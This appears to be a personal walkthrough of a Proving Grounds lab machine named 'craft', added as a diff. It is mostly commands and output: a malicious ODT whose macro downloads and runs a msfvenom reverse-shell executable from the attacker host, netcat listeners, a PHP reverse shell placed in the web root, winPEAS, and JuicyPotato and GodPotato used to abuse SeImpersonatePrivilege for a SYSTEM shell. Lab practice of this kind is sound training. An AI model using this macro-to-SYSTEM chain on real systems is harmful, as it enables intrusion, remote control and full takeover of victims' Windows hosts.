@@ -1,0 +1,279 @@
+No credentials were provided for this machine
+
+nmap -vvv -T5 -Pn 192.168.164.169 -p- -A -oN nmap.txt
+
+sudo echo "192.168.164.169 craft.offsec" | sudo tee -a /etc/hosts
+
+http://craft.offsec/upload.php
+
+Request
+--------------------------------
+POST /upload.php HTTP/1.1
+Host: craft.offsec
+Content-Length: 586
+Cache-Control: max-age=0
+Origin: http://craft.offsec
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryz3Tx6HU78RL880JG
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://craft.offsec/
+Accept-Encoding: gzip, deflate, br
+Accept-Language: en-US,en;q=0.9
+Connection: keep-alive
+
+------WebKitFormBoundaryz3Tx6HU78RL880JG
+Content-Disposition: form-data; name="file"; filename="0EkkzKUf"
+Content-Type: application/octet-stream
+
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Blog | Mezzanine</title><link>http://127.0.0.1:8000/blog/</link><description>Blog</description><atom:link rel="self" href="http://127.0.0.1:8000/blog/feeds/rss/"></atom:link><language>en</language><lastBuildDate>Fri, 17 Oct 2025 17:50:30 +0000</lastBuildDate></channel></rss>
+------WebKitFormBoundaryz3Tx6HU78RL880JG--
+
+Response
+--------------------------------
+HTTP/1.1 200 OK
+Date: Mon, 20 Oct 2025 19:30:26 GMT
+Server: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+X-Powered-By: PHP/8.0.7
+Content-Length: 41
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
+
+File is not valid. Please submit ODT file
+
+https://github.com/jotyGill/macro-generator.git
+
+┌──(lepotekil㉿kali)-[~/tools/macro-generator]
+└─$ python3 macro-generator.py --host 192.168.45.170 --port 4444 -r '192.168.45.170:8000/rshell.exe'
+...
+For OpenOffice
+
+Sub Main
+    Shell("cmd /c powershell -Command iwr 'http://192.168.45.170:443/rshell.exe' -OutFile 'C:\wamp\www\rshell.exe'")
+    Shell("cmd /c 'C:\wamp\www\rshell.exe'")
+End Sub
+...
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/craft]
+└─$ file payload2.odt                        
+payload2.odt: OpenDocument Text
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/craft]
+└─$ unzip -p payload2.odt Basic/Standard/Module1.xml | sed -n '1,200p'                                                                                                       
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE script:module PUBLIC "-//OpenOffice.org//DTD OfficeDocument 1.0//EN" "module.dtd">
+<script:module xmlns:script="http://openoffice.org/2000/script" script:name="Module1" script:language="StarBasic" script:moduleType="normal">Sub Main
+    Shell(&quot;cmd /c powershell -Command iwr &apos;http://192.168.45.170:443/rshell.exe&apos; -OutFile &apos;C:\wamp\www\rshell.exe&apos;&quot;)
+    Shell(&quot;cmd /c &apos;C:\wamp\www\rshell.exe&apos;&quot;)
+End Sub
+</script:module>
+
+┌──(lepotekil㉿kali)-[~/tools/macro-generator]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.170 LPORT=4444 -f exe -o rshell.exe      
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 7168 bytes
+Saved as: rshell.exe
+                                                                                                                                                                                                                                            
+┌──(lepotekil㉿kali)-[~/tools/macro-generator]
+└─$ python3 -m http.server 443                                                                
+Serving HTTP on 0.0.0.0 port 443 (http://0.0.0.0:443/) ...
+192.168.164.169 - - [20/Oct/2025 16:37:13] "GET /rshell.exe HTTP/1.1" 200 -
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/craft]
+└─$ nc -lvnp 4444                                       
+listening on [any] 4444 ...
+connect to [192.168.45.170] from (UNKNOWN) [192.168.164.169] 50144
+Microsoft Windows [Version 10.0.17763.2029]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Program Files\LibreOffice\program>whoami
+whoami
+craft\thecybergeek
+
+C:\Program Files\LibreOffice\program>powershell
+powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\Users\thecybergeek\desktop> type local.txt
+type local.txt
+eff8b367f5c85b621aac4e689756e8ba
+PS C:\Users\thecybergeek\desktop> iwr http://192.168.45.170:8000/winPEAS.bat -OutFile winPEAS.bat
+iwr http://192.168.45.170:8000/winPEAS.bat -OutFile winPEAS.bat
+PS C:\Users\thecybergeek\desktop> dir
+dir
+
+
+    Directory: C:\Users\thecybergeek\desktop
+
+
+Mode                LastWriteTime         Length Name                                                                  
+----                -------------         ------ ----                                                                  
+-a----       10/20/2025  12:15 PM             34 local.txt                                                             
+-a----       10/20/2025   1:47 PM          36950 winPEAS.bat                                                           
+
+
+PS C:\Users\thecybergeek\desktop> .\winPEAS.bat
+.\winPEAS.bat
+
+            ((,.,/((((((((((((((((((((/,  */
+     ,/*,..*(((((((((((((((((((((((((((((((((,                                                                                                                                                                                              
+   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*                                                                                                                                                                                           
+   ((((((((((((((((* *****,,,/########## .(* ,((((((                                                                                                                                                                                        
+   (((((((((((/* ******************/####### .(. ((((((                                                                                                                                                                                      
+   ((((((..******************/@@@@@/**
+.....
+
+"We will then migrate to the apache user and abuse the SeImpersonatePrivilege permission to elevate our privileges."
+
+PS C:\xampp\htdocs> iwr http://192.168.45.170:8000/revshell.php -OutFile revshell.php                                                                                                                                                       
+iwr http://192.168.45.170:8000/revshell.php -OutFile revshell.php                                                                                                                                                                           
+PS C:\xampp\htdocs> dir                                                                                                                                                                                                                     
+dir                                                                                                                                                                                                                                         
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+    Directory: C:\xampp\htdocs                                                                                                                                                                                                              
+                                                                                                                                                                                                                                            
+                                                                                                                                                                                                                                            
+Mode                LastWriteTime         Length Name                                                                                                                                                                                       
+----                -------------         ------ ----                                                                                                                                                                                       
+d-----        7/13/2021   3:18 AM                assets                                                                                                                                                                                     
+d-----        7/13/2021   3:18 AM                css                                                                                                                                                                                        
+d-----        7/13/2021   3:18 AM                js                                                                                                                                                                                         
+d-----       10/20/2025   1:37 PM                uploads                                                                                                                                                                                    
+-a----         7/7/2021  10:53 AM           9635 index.php                                                                                                                                                                                  
+-a----       10/20/2025   2:06 PM           9289 revshell.php                                                                                                                                                                               
+-a----         7/7/2021   9:56 AM            835 upload.php
+
+http://craft.offsec/revshell.php
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/craft]
+└─$ nc -lvnp 5555                                       
+listening on [any] 5555 ...
+connect to [192.168.45.170] from (UNKNOWN) [192.168.164.169] 50195
+SOCKET: Shell has connected! PID: 996
+Microsoft Windows [Version 10.0.17763.2029]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs>whoami
+craft\apache
+
+C:\xampp\htdocs>powershell
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+
+PS C:\xampp\htdocs> iwr http://192.168.45.170:8000/winPEAS.bat -OutFile winPEAS.bat
+PS C:\xampp\htdocs> .\winPEAS.bat 
+
+            ((,.,/((((((((((((((((((((/,  */
+     ,/*,..*(((((((((((((((((((((((((((((((((,
+   ,*/((((((((((((((((((/,  .*//((//**, .*((((((*
+   ((((((((((((((((* *****,,,/########## .(* ,((((((
+   (((((((((((/* ******************/####### .(. ((((((
+   ((((((..******************/@@@@@/***/###### /((((((
+   ,,..**********************@@@@@@@@@@(***,#### ../(((((
+   , ,**********************#@@@@@#@@@@*********##((/ /((((
+   ..(((##########*********/#@@@@@@@@@/*************,,..((((
+   .(((################(/******/@@@@@#****************.. /((
+   .((########################(/************************..*(
+   .((#############################(/********************.,(
+   .((##################################(/***************..(
+   .((######################################(************..(
+   .((######(,.***.,(###################(..***(/*********..(
+   .((######*(#####((##################((######/(********..(
+   .((##################(/**********(################(**...(
+   .(((####################/*******(###################.((((
+   .(((((############################################/  /((
+   ..(((((#########################################(..(((((.
+   ....(((((#####################################( .((((((.
+   ......(((((#################################( .(((((((.
+   (((((((((. ,(############################(../(((((((((.
+       (((((((((/,  ,####################(/..((((((((((.
+             (((((((((/,.  ,*//////*,. ./(((((((((((.
+                (((((((((((((((((((((((((((/
+                       by carlospolop       
+....
+
+PRIVILEGES INFORMATION                                                                                                                                                                                                                      
+----------------------                                                                                                                                                                                                                      
+                                                                                                                                                                                                                                            
+Privilege Name                Description                               State                                                                                                                                                               
+============================= ========================================= ========                                                                                                                                                            
+SeTcbPrivilege                Act as part of the operating system       Disabled                                                                                                                                                            
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled                                                                                                                                                             
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled                                                                                                                                                             
+SeCreateGlobalPrivilege       Create global objects                     Enabled                                                                                                                                                             
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled   
+
+S C:\xampp\htdocs> iwr http://192.168.45.170:8000/nc64.exe -OutFile nc64.exe                                                                                                                                                                
+PS C:\xampp\htdocs> iwr http://192.168.45.170:8000/JuicyPotato.exe -OutFile JuicyPotato.exe                                                                                                                                                 
+PS C:\xampp\htdocs> .\JuicyPotato.exe -t * -p c:\windows\system32\cmd.exe -a "/c C:\xampp\htdocs\nc64.exe 192.168.45.170 6666 -e cmd.exe" -l 6666 -c "{4991d34b-80a1-4291-83b6-3328366b9097}"                                               
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 6666                                                                                                                                                                                         
+COM -> recv failed with error: 10038                                                                                                                                                                                                        
+PS C:\xampp\htdocs> .\JuicyPotato.exe -t * -p c:\windows\system32\cmd.exe -a "/c C:\xampp\htdocs\nc64.exe 192.168.45.170 6666 -e cmd.exe" -l 6666 -c "{90F18417-F0F1-484E-9D3C-59DCEEE5DBD8}"                                               
+Testing {90F18417-F0F1-484E-9D3C-59DCEEE5DBD8} 6666                                                                                                                                                                                         
+COM -> recv failed with error: 10038
+
+https://decoder.cloud/2018/10/29/no-more-rotten-juicy-potato/
+
+https://github.com/BeichenDream/GodPotato
+
+PS C:\xampp\htdocs> .\GodPotato-NET4.exe -cmd "nc64.exe 192.168.45.170 6666 -e cmd.exe"
+[*] CombaseModule: 0x140723494715392
+[*] DispatchTable: 0x140723497028800
+[*] UseProtseqFunction: 0x140723496405728
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\35f2eada-fefc-4361-ba57-95aa6248655a\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 0000e402-0604-ffff-ac51-4b59c02e26a4
+[*] DCOM obj OXID: 0x4f9f1e8d33234cde
+[*] DCOM obj OID: 0x218fe5d47662d462
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 876 Token:0x804  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 4568
+...
+
+┌──(lepotekil㉿kali)-[~/proving-ground-prac/craft]
+└─$ nc -lvnp 6666                                       
+listening on [any] 6666 ...
+connect to [192.168.45.170] from (UNKNOWN) [192.168.164.169] 50271
+Microsoft Windows [Version 10.0.17763.2029]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>cd C:\Users\Administrator\Desktop
+cd C:\Users\Administrator\Desktop
+
+C:\Users\Administrator\Desktop>dir
+dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5C30-DCD7
+
+ Directory of C:\Users\Administrator\Desktop
+
+07/13/2021  03:38 AM    <DIR>          .
+07/13/2021  03:38 AM    <DIR>          ..
+10/20/2025  12:15 PM                34 proof.txt
+               1 File(s)             34 bytes
+               2 Dir(s)  10,668,052,480 bytes free
+t
+C:\Users\Administrator\Desktoptype proof.txt
+type proof.txt
+7686a45753c5477f27505cea686c40cf
